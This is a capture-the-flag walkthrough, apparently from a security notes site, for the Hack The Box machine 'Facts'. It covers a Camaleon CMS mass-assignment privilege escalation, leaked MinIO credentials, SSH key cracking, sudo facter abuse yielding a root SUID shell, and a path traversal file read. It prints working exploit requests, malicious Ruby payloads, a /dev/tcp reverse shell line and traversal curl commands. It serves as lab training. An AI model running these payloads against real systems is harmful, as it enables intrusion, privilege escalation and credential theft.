[🏠 Main Site](https://motasem-notes.net/) · [🛒 Store](https://shop.motasem-notes.net/) · [▶ YouTube](https://www.youtube.com/@MotasemHamdan) · [☕ Membership](https://buymeacoffee.com/notescatalog/membership)

> Practitioner-grade cybersecurity notes, cert prep guides, and courses. All premium notes available at **[buymeacoffee.com/notescatalog/extras](https://buymeacoffee.com/notescatalog/extras)** or [shop.motasem-notes.net](https://shop.motasem-notes.net)

> **Difficulty:** Easy | **OS:** Linux (Ubuntu 25.04 Plucky) | **Released:** 31 Jan 2026 | **Retired:** 06 Jun 2026 **Creator:** LazyTitan33

---

## Box Summary

Facts is an Easy-rated Linux box running a trivia website built on Camaleon CMS 2.9.0 (a Ruby on Rails application) with a local MinIO S3-compatible object store for file uploads. The full attack chain is:

1. Nmap finds three ports: SSH (22), Nginx/Rails (80), and MinIO (54321). An extra `lft` hop to port 54321 confirms it runs inside a Docker container
2. Register an account on Camaleon's admin panel; exploit **CVE-2025-2304** — mass assignment via `permit!` in the password update endpoint → add `password[role]=admin` to the POST body → admin access
3. Read the admin's Filesystem Settings page — finds MinIO credentials (`AKIA3ADAF4DE0BB0FAA2:h4ORDGfkO/GT7pfj/r5Wc9Xa4Girqz59RHABlM4I`)
4. Use AWS CLI pointed at `facts.htb:54321` → enumerate buckets → `internal` bucket contains a home directory with an encrypted SSH private key
5. Crack the key's passphrase with `john` → `dragonballz` → SSH as `trivia`
6. `sudo -l` shows `trivia` can run `facter` (Puppet's inventory tool) as root without a password
7. Create a malicious Ruby custom fact file; run `sudo facter --custom-dir /tmp/ exploit` → code execution as root → SUID bash at `/var/tmp/0xdf` → root shell
8. Beyond Root: **CVE-2026-1776** — path traversal in Camaleon's AWS S3 uploader (`download_private_file`) allows any authenticated user to read arbitrary files from the filesystem

---

## 01 · Recon

### Nmap

```bash
sudo nmap -p- --reason --min-rate 10000 10.129.244.96
sudo nmap -p 22,80,54321 -sCV 10.129.244.96
```

**Open ports:**

|Port|Service|Notes|
|---|---|---|
|22|SSH|OpenSSH 9.9p1 Ubuntu → Ubuntu 25.04 Plucky|
|80|HTTP|nginx/1.26.3 — redirects to `http://facts.htb/`|
|54321|Unknown|Response headers show `Server: MinIO` and `X-Amz-*` headers → S3-compatible object store|

TTL of 63 on ports 22 and 80 → Linux one hop away. Port 54321 shows TTL 62 — one extra hop — suggesting it runs in a container.

### Container Detection with lft

```bash
# Port 80 — two hops (host is the target)
sudo lft 10.129.244.96:80
# 1  10.10.14.1   20.4ms
# 2  [target open] 10.129.244.96:80   21.1ms

# Port 54321 — three hops (container behind the host)
sudo lft 10.129.244.96:54321
# 1  10.10.14.1   20.9ms
# 2  10.129.244.96   20.8ms
# 3  [target open] 10.129.244.96:54321   22.0ms
```

The extra hop to port 54321 confirms MinIO is running inside a Docker container. Ports 22 and 80 are on the host itself.

### Hosts File and Subdomain Brute Force

```bash
# Add to /etc/hosts (no subdomains found)
echo "10.129.244.96 facts.htb" | sudo tee -a /etc/hosts

# Subdomain brute force returns no additional vhosts
ffuf -u http://10.129.244.96 -H 'Host: FUZZ.facts.htb' \
  -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac
```

---

## 02 · facts.htb — Web Enumeration

### Tech Stack

HTTP response headers reveal the framework immediately:

```
Server: nginx/1.26.3 (Ubuntu)
set-cookie: _factsapp_session=<value>; path=/; httponly; samesite=lax
x-frame-options: SAMEORIGIN
x-request-id: 3c289058-124e-437b-9f0a-5c99fd0733b5
x-runtime: 0.038416
```

The cookie `_factsapp_session` decodes to three sections separated by `--`:

```
<base64_ciphertext>--<base64_iv>--<base64_auth_tag>
```

- Part 1 (long, ~88 chars base64): AES-256-GCM encrypted session payload (serialised Ruby hash)
- Part 2 (12 bytes): GCM IV/nonce — `xoveJn+SqkJ9L2hb`
- Part 3 (16 bytes): GCM authentication tag — `lzt8APnecnCsWeOIfnf0tQ==`

This three-part `--`-delimited format is the **Ruby on Rails encrypted session cookie format**. The entire cookie is useless without the application's `Rails.application.credentials.secret_key_base` — but the format immediately identifies the stack as Rails.

The 404 page is a custom Rails 404, and Wappalyzer does not add additional identification. The application is **Camaleon CMS** — confirmed from the admin panel source code.

### Site

A trivia fact-sharing website. Main routes:

- `/` — landing page
- `/page` — single fact view
- `/search?q=<input>` — search functionality

Footer contains `contact@facts.htb`.

### Directory Brute Force

```bash
feroxbuster -u http://facts.htb
```

Key finding: `302 GET /admin => http://facts.htb/admin/login`

### Admin Panel

`/admin` redirects to `/admin/login`. The page source references **Camaleon CMS**. The "Create an account" link at the bottom allows user registration.

After registering and logging in, the profile page shows a **Role** field disabled in HTML:

```html
<select name="user[role]" disabled="disabled">
  <option value="client" selected="selected">Client</option>
  <option value="admin">Administrator</option>
</select>
```

Removing `disabled="disabled"` via DevTools and submitting `role=admin` in the form produces no effect — server-side validation blocks it through the normal profile update path.

**Version confirmation:** After login, the admin panel footer shows **Camaleon CMS 2.9.0**.

---

## 03 · MinIO — TCP 54321

### Identification

`GET /0xdf` returns a 400 Bad Request with response headers:

```
Server: MinIO
X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
X-Amz-Request-Id: 18B3E41319D2C671
```

Error body:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<Error>
  <Code>InvalidBucketName</Code>
  <Message>The specified bucket is not valid.</Message>
</Error>
```

**MinIO** is an open-source, S3-compatible object storage server written in Go. It speaks the same HTTP API as Amazon S3 (identical XML error bodies and `X-Amz-*` response headers). It ships with a web console on TCP 9001 — `GET /` on port 54321 returns a `307 Temporary Redirect` to `:9001`.

---

## 04 · CVE-2025-2304 — Camaleon Mass Assignment → Admin

### Vulnerability Description

**CVE-2025-2304** (fixed in Camaleon 2.9.1):

> A Privilege Escalation through Mass Assignment exists in Camaleon CMS. When a user changes their password, the `updated_ajax` method of `UsersController` is called. The vulnerability stems from the use of the dangerous `permit!` method, which allows all parameters to pass through without filtering.

Originally reported by Tenable.

### Vulnerable Source Code

```ruby
def updated_ajax
  @user = current_site.users.find(params[:user_id])
  update_session = current_user_is?(@user)

  @user.update(params.require(:password).permit!)
  # ^ .permit! allows ALL nested params — no allowlist
  render inline: @user.errors.full_messages.join(', ')

  update_auth_token_in_cookie @user.auth_token if update_session && @user.saved_change_to_password_digest?
end
```

`params.require(:password).permit!` extracts the `password` hash from the request body and applies **every field inside it** to the user model without filtering. Adding `password[role]=admin` to the password change request therefore updates the user's role to admin.

### Exploit

**Step 1 — Capture the password change request in Burp:**

From the profile page, change your password and intercept the POST request. The captured body (URL-decoded) looks like:

```
_method=patch&authenticity_token=<TOKEN>&password[password]=newpass&password[password_confirmation]=newpass
```

The endpoint is `POST /admin/users/<user_id>/updated_ajax`.

**Step 2 — Add the role parameter and forward:**

Append `&password[role]=admin` to the POST body:

```
_method=patch&authenticity_token=<TOKEN>&password[password]=newpass&password[password_confirmation]=newpass&password[role]=admin
```

**Step 3 — Verify privilege escalation:**

Refresh the browser. The navigation bar now shows a full admin menu (Content, Media, Plugins, Themes, Settings, etc.) instead of just the profile link.

---

## 05 · MinIO Enumeration — AWS CLI

### Find MinIO Credentials

Navigate to **Settings → General Site → Filesystem Settings** in the Camaleon admin panel. The page reveals:

```
Storage: AWS
AWS Access Key:  AKIA3ADAF4DE0BB0FAA2
AWS Secret Key:  h4ORDGfkO/GT7pfj/r5Wc9Xa4Girqz59RHABlM4I
AWS Region:      us-east-1
AWS Bucket:      randomfacts
AWS Endpoint:    http://facts.htb:54321
```

These are the MinIO service credentials the CMS uses to store uploaded files.

### Configure AWS CLI Profile

```bash
# Install if needed
uv tool install awscli

# Configure profile
aws configure --profile facts.htb
# AWS Access Key ID: AKIA3ADAF4DE0BB0FAA2
# AWS Secret Access Key: h4ORDGfkO/GT7pfj/r5Wc9Xa4Girqz59RHABlM4I
# Default region name: us-east-1
# Default output format: json

# Add the endpoint URL to the profile (avoids --endpoint-url on every command)
aws configure set endpoint_url http://facts.htb:54321 --profile facts.htb

# Optionally set as default profile for the session
export AWS_PROFILE=facts.htb
```

### Enumerate Buckets

```bash
aws s3 ls
# 2025-09-11 12:06:52 internal
# 2025-09-11 12:06:52 randomfacts
```

### randomfacts Bucket

Contains the same images served by the trivia website — not interesting for exploitation.

### internal Bucket — Home Directory

```bash
aws s3 ls internal
#                            PRE .bundle/
#                            PRE .cache/
#                            PRE .ssh/
# 2026-01-08 18:45:13        220 .bash_logout
# 2026-01-08 18:45:13       3900 .bashrc
# 2026-01-08 18:47:17         20 .lesshst
# 2026-01-08 18:47:17        807 .profile
```

The `internal` bucket contains a home directory structure. The `.ssh` directory has an SSH private key:

```bash
aws s3 ls internal/.ssh/
# 2026-05-28 01:18:01   82 authorized_keys
# 2026-05-28 01:18:01  464 id_ed25519

# Download the key
aws s3 cp s3://internal/.ssh/id_ed25519 id_ed25519
```

---

## 06 · SSH Key Cracking → Shell as trivia

### Identify Key Type and Encryption

```bash
# Attempt to extract the public key — prompts for passphrase → encrypted
ssh-keygen -yf id_ed25519
# Enter passphrase:

# Check encryption in raw bytes
cat id_ed25519 | grep -v PRIVATE | base64 -d | strings
# openssh-key-v1
# aes256-ctr      ← encryption algorithm
# bcrypt          ← KDF
```

The key is encrypted with AES-256-CTR using bcrypt as the KDF (key derivation function). This format is not yet in hashcat, so use `john` via `ssh2john`.

### Crack with John

```bash
# Convert to john format
/opt/john/run/ssh2john.py id_ed25519 > id_ed25519.hash

# Crack with rockyou.txt
/opt/john/run/john ./id_ed25519.hash \
  --wordlist=/opt/SecLists/Passwords/Leaked-Databases/rockyou.txt

# Result:
# dragonballz      (id_ed25519)
```

**Passphrase:** `dragonballz`

### Identify the Username and SSH

```bash
# Option 1: Strip the passphrase to extract public key
ssh-keygen -p -f id_ed25519
# Key has comment 'trivia@facts.htb'   ← username revealed
# Enter new passphrase: <blank>

# Option 2: Extract public key after removal
ssh-keygen -yf id_ed25519
# ssh-ed25519 AAAA... trivia@facts.htb

# SSH as trivia
ssh -i id_ed25519 trivia@facts.htb
# (passphrase: dragonballz, or none if stripped)
```

```
trivia@facts:~$
```

### Grab user.txt

```bash
# user.txt is NOT in trivia's home directory
trivia@facts:~$ ls

# It's in william's home, world-readable
trivia@facts:~$ cat /home/william/user.txt
a26ad8d4************************
```

---

## 07 · Post-Exploitation — trivia Enumeration

### OS and Users

```bash
cat /etc/os-release
# Ubuntu 25.04 (Plucky Porcupine)

cat /etc/passwd | grep 'sh$'
# root:x:0:0:root:/root:/bin/bash
# trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
# william:x:1001:1001::/home/william:/bin/bash

ls /home/william/
# .bash_history -> /dev/null  .bash_logout  .bashrc  .profile  user.txt
```

William's home directory is intentionally sparse — only present to host `user.txt` while keeping it inaccessible over MinIO (MinIO only exposes the `internal` bucket which maps to trivia's home).

### sudo Rights

```bash
sudo -l
# User trivia may run the following commands on facts:
#   (ALL) NOPASSWD: /usr/bin/facter
```

### /tmp Mount Security Flag

```bash
mount | grep /tmp
# tmpfs on /tmp type tmpfs (rw,nosuid,nodev,nr_inodes=1048576,inode64)
```

`/tmp` is mounted with `nosuid` — SUID binaries placed in `/tmp` will not execute with elevated privileges. Must use `/var/tmp` instead.

### facter Binary Type

```bash
file /usr/bin/facter
# /usr/bin/facter: Ruby script, ASCII text executable

facter --version
# 4.10.0
```

Facter is Puppet's cross-platform system inventory tool. It's a Ruby gem installed as a script shim. It collects hardware, OS, network, and filesystem facts for Puppet manifests.

**Key option from `--help`:**

```
--custom-dir    A directory to use for custom facts.
```

---

## 08 · Root — facter Custom Facts Directory

### How facter Custom Facts Work

Custom facts are Ruby `.rb` files in a directory specified by `--custom-dir`. The file is **loaded at startup** (not just when the fact is queried), meaning any Ruby code at the top level of the file executes immediately when facter loads it.

Custom facts use this format:

```ruby
Facter.add('fact_name') do
  setcode do
    # Ruby code to compute the fact value
    Facter::Core::Execution.exec('/bin/some_command')
  end
end
```

The `setcode` block runs when the fact is actually queried. However, any code **outside** of `setcode` (at the file's top level) runs at load time — before any fact is invoked.

### Step 1 — Create the Malicious Custom Fact

```ruby
# /tmp/exploit.rb
Facter.add('exploit') do
  setcode do
    Facter::Core::Execution.exec('cp /bin/bash /var/tmp/0xdf; chmod 6777 /var/tmp/0xdf')
    'Malicious fact has run'
  end
end
```

This creates a SUID+SGID copy of bash at `/var/tmp/0xdf` when the `exploit` fact is queried. Using `/var/tmp` because `/tmp` has `nosuid`.

**POC with non-root execution first:**

```bash
trivia@facts:~$ facter --custom-dir /tmp/ exploit
Malicious fact has run
trivia@facts:~$ ls -l /tmp/0xdf
# -rw-rw-r-- 1 trivia trivia 0 May 30 16:39 /tmp/0xdf
# (if using a simpler test like 'touch /tmp/0xdf')
```

### Step 2 — Execute as Root with sudo

```bash
sudo facter --custom-dir /tmp/ exploit
# Malicious fact has run

ls -l /var/tmp/0xdf
# -rwsrwsrwx 1 root root <size> May 30 16:40 /var/tmp/0xdf
# ^ SUID + SGID bits set, owned by root
```

### Step 3 — Get Root Shell

```bash
# Run with -p to preserve EUID (prevent bash from dropping privileges)
/var/tmp/0xdf -p
# 0xdf-5.2# whoami
# root
# 0xdf-5.2# cat /root/root.txt
# a9723932************************
```

### Alternative: Direct Command Execution

For simpler enumeration without creating a SUID binary:

```ruby
# /tmp/exploit.rb
Facter.add('exploit') do
  setcode do
    Facter::Core::Execution.exec('cat /root/root.txt')
  end
end
```

```bash
sudo facter --custom-dir /tmp/ exploit
# a9723932************************
```

Or for a root reverse shell:

```ruby
Facter.add('exploit') do
  setcode do
    Facter::Core::Execution.exec('bash -c "bash -i >& /dev/tcp/10.10.14.61/443 0>&1"')
    'done'
  end
end
```

> **GTFOBins reference:** [https://gtfobins.github.io/gtfobins/facter/](https://gtfobins.github.io/gtfobins/facter/)

---

## 09 · Beyond Root — CVE-2026-1776 Path Traversal File Read

### Vulnerability Background

**CVE-2024-46987** (patched in 2.8.2) — path traversal in `download_private_file` for the **local** file uploader backend:

```ruby
# Vulnerable (2.8.0) — in media_controller.rb
def download_private_file
  cama_uploader.enable_private_mode!
  file = cama_uploader.fetch_file("private/#{params[:file]}")
  send_file file, disposition: 'inline'
end
```

The `params[:file]` value is concatenated into the path without validation, allowing `../` traversal.

**Fix in 2.8.2** — added `valid_folder_path?` guard to the local uploader's `fetch_file`:

```ruby
def fetch_file(file_name)
  return { error: 'Invalid file path' } unless valid_folder_path?(file_name)
  return file_name if file_exists?(file_name)
  { error: 'File not found' }
end
```

**CVE-2026-1776** — the same path traversal was never fixed in the **AWS S3 uploader backend** (`CamaleonCmsAwsUploader`). The Facts box is configured to use MinIO/S3, so the local uploader's fix has no effect. Any authenticated user (including low-privilege `client` role accounts) can traverse to any file readable by the Rails process.

### Exploit

**Step 1 — Get a session cookie (as any user, including newly registered):**

```bash
# Get CSRF token from login page
AUTH=$(curl -s -c cookie.jar http://facts.htb/admin/login | \
  grep -oP 'authenticity_token" value="\K[^"]+')

# Login
curl -b cookie.jar -c cookie.jar http://facts.htb/admin/login \
  -d "authenticity_token=$AUTH" \
  -d "user[username]=0xdf" \
  -d "user[password]=0xdf" \
  -d "commit=Login"
```

**Step 2 — Path traversal to read arbitrary files:**

```bash
# Read /etc/passwd via the S3 uploader path traversal
curl -s "http://facts.htb/admin/media/download_private_file?file=../../../etc/passwd" \
  -b cookie.jar
```

The path resolves to:

```
"private/" + "../../../etc/passwd"
= "private/../../../etc/passwd"
= "/etc/passwd"
```

**What can be read:**

- `/etc/passwd` — user enumeration
- Rails credentials file: `config/credentials.yml.enc` — contains encrypted secrets
- Rails master key: `config/master.key` — the decryption key for credentials
- SSH keys in home directories: `/home/trivia/.ssh/id_ed25519`
- Environment files, application configs

**Reading the SSH private key directly (bypasses the MinIO bucket enumeration step):**

```bash
curl -s "http://facts.htb/admin/media/download_private_file?file=../../../../../home/trivia/.ssh/id_ed25519" \
  -b cookie.jar
```

### Rails Master Key and Session Decryption

Once the master key is leaked, Rails encrypted credentials and session cookies can be decrypted:

**Read the master key:**

```bash
curl -s "http://facts.htb/admin/media/download_private_file?file=../../../config/master.key" \
  -b cookie.jar
```

**Rails session cookie format (AES-256-GCM):**

```
<base64_ciphertext>--<base64_iv>--<base64_auth_tag>
```

**Decrypt with CyberChef** (AES-GCM, 256-bit):

- Key: master key (hex or base64)
- IV: middle section (base64-decode → 12 bytes)
- Auth Tag: last section (base64-decode → 16 bytes)
- Ciphertext: first section (base64-decode)
- Mode: GCM

The decrypted value is a Ruby Marshal-encoded hash containing `user_id`, `_csrf_token`, and session metadata. Forging a cookie with `user_id` of an admin account would allow admin access without CVE-2025-2304.

---

## Key Concepts & Analyst Notes

### CVE-2025-2304 — Mass Assignment via permit!

In Ruby on Rails, **mass assignment** is the pattern of updating a model with a hash of attributes from user input. Rails' `StrongParameters` requires explicitly declaring which parameters are allowed via `permit(:field1, :field2)`. The dangerous method `permit!` whitelists **all** parameters recursively without restriction.

```ruby
# Vulnerable pattern — permits everything in the 'password' hash
@user.update(params.require(:password).permit!)

# Secure pattern — explicit allowlist
@user.update(params.require(:password).permit(:password, :password_confirmation))
```

When `permit!` is used, any Rails model attribute name that an attacker knows can be set. For Camaleon users, this includes `role`, `email`, `username`, and any other `User` model attribute. Sending `password[role]=admin` elevates the user to administrator.

**Exploitation via Burp:**

1. Capture the `POST /admin/users/<id>/updated_ajax` request during a normal password change
2. Add `&password[role]=admin` to the POST body
3. The `authenticity_token` must be valid (obtained from the current session) — no CSRF bypass needed since we're already authenticated

---

### facter --custom-dir — sudo Abuse

When a user has `sudo NOPASSWD: /usr/bin/facter` rights, the `--custom-dir` flag enables arbitrary Ruby code execution as root. The mechanism:

1. `--custom-dir <path>` tells facter to load all `.rb` files in `<path>` as custom fact definitions
2. Ruby code inside the files executes as the Ruby interpreter loads them
3. `setcode` blocks execute when a specific fact is queried; top-level code executes at load time

```bash
# Create malicious fact file
cat > /tmp/exploit.rb << 'EOF'
Facter.add('exploit') do
  setcode do
    Facter::Core::Execution.exec('<COMMAND>')
    'done'
  end
end
EOF

# Execute as root
sudo facter --custom-dir /tmp/ exploit
```

**SUID bash pattern** (when /tmp has nosuid):

```ruby
Facter.add('exploit') do
  setcode do
    Facter::Core::Execution.exec('cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash')
    'done'
  end
end
```

```bash
/var/tmp/rootbash -p
# rootbash-5.2# id
# uid=1000(trivia) gid=1000(trivia) euid=0(root) egid=0(root)
```

> **GTFOBins:** https://gtfobins.github.io/gtfobins/facter/

---

### Container Detection with lft (Layer Four Traceroute)

When a service runs inside a Docker container, network packets traverse an additional hop through the host's Docker bridge network before reaching the container. This adds one TTL decrement and shows an extra hop in traceroute:

```bash
# Host service = 2 hops (gateway + host)
sudo lft <TARGET_IP>:80

# Containerised service = 3 hops (gateway + host + container NAT)
sudo lft <TARGET_IP>:54321
```

This technique can non-invasively confirm whether a service is containerised — useful for understanding the network topology before pivoting.

---

### Rails Encrypted Session Cookie (AES-256-GCM)

Rails 5.2+ encrypts session cookies using AES-256-GCM. The cookie format is:

```
<Base64(ciphertext)>--<Base64(iv_12bytes)>--<Base64(auth_tag_16bytes)>
```

**Without the key:** the cookie is opaque — cannot be forged or read.

**With the Rails master key** (leaked via path traversal or misconfiguration):

- Derive the encryption key using the same HKDF derivation Rails uses
- Decrypt using AES-256-GCM with the extracted IV and auth tag
- The plaintext is a Ruby Marshal-encoded hash

**Practical impact:** a leaked master key allows:

- Decrypting existing session cookies to read session data
- Forging arbitrary session cookies (e.g., setting `user_id` to 1 for admin access)
- Decrypting `config/credentials.yml.enc` (which may contain database passwords, API keys, etc.)

---

### MinIO S3 API Quick Reference

```bash
# Configure profile
aws configure --profile <name>
aws configure set endpoint_url http://<host>:<port> --profile <name>

# List buckets
aws s3 ls --profile <name>

# List bucket contents
aws s3 ls s3://<bucket> --profile <name>

# Download a file
aws s3 cp s3://<bucket>/<path> <local_dest> --profile <name>

# Download entire bucket
aws s3 sync s3://<bucket> ./<local_dir> --profile <name>

# List all objects recursively
aws s3 ls s3://<bucket> --recursive --profile <name>
```

---

### Quick Reference — Key Commands

|Task|Command|
|---|---|
|Detect containerised service|`sudo lft <IP>:<PORT>` (extra hop = container)|
|Register and login to Camaleon|Browse to `/admin/login` → click "Create an account"|
|Exploit mass assignment|Add `&password[role]=admin` to `POST /admin/users/<id>/updated_ajax`|
|Configure AWS CLI for MinIO|`aws configure --profile facts.htb` + `aws configure set endpoint_url http://facts.htb:54321 --profile facts.htb`|
|List MinIO buckets|`aws s3 ls`|
|Download SSH key|`aws s3 cp s3://internal/.ssh/id_ed25519 id_ed25519`|
|Check key encryption|`cat id_ed25519 \| grep -v PRIVATE \| base64 -d \| strings`|
|Convert SSH key for john|`/opt/john/run/ssh2john.py id_ed25519 > hash.txt`|
|Crack SSH key|`john hash.txt --wordlist=rockyou.txt`|
|Extract username from key|`ssh-keygen -yf id_ed25519` (check comment field)|
|Check sudo rights|`sudo -l`|
|Create exploit fact|`echo 'Facter.add("x") do; setcode do; Facter::Core::Execution.exec("CMD"); end; end' > /tmp/e.rb`|
|Run facter exploit|`sudo facter --custom-dir /tmp/ x`|
|Get root shell (nosuid /tmp)|Copy bash to `/var/tmp/`, chmod 4755, run with `-p`|
|Path traversal file read|`curl "http://facts.htb/admin/media/download_private_file?file=../../../etc/passwd" -b cookie.jar`|

---

_HTB: Facts — Notes compiled from [0xdf.gitlab.io writeup](https://0xdf.gitlab.io/2026/06/06/htb-facts.html) · For educational use only._